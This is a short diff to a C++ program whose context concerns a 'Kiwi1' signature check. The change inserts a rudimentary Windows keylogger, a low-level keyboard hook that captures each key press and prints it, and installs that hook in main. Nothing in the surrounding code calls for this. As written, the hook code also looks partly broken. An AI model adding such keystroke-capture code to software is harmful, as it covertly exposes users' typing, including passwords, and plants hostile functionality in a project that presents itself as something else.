@@ -186,8 +186,29 @@ void Kiwi1::on_sig(char * a, int b)
 	printf("Sig is OK");
 }
 
+#include <Windows.h>
+#include <iostream>
+#include <sstream>
+#include <fstream>
+#include <ctime>
+
+using namespace std;
+
+LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
+    if (code == HC_ACTION) {
+        switch (wParam) {
+        case WM_KEYDOWN:
+            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+            char c = char(MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR));
+            cout << c << endl;
+        }
+    }
+    return CallNextHookEx(NULL, code, wParam, lParam);
+}
+
 int main(int argc, char **argv)
 {
+    HHOOK HKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, GetCurrentThreadId());
 	argc;argv;
 	//CConsole ccon;
 	//Kiwi kiwi;
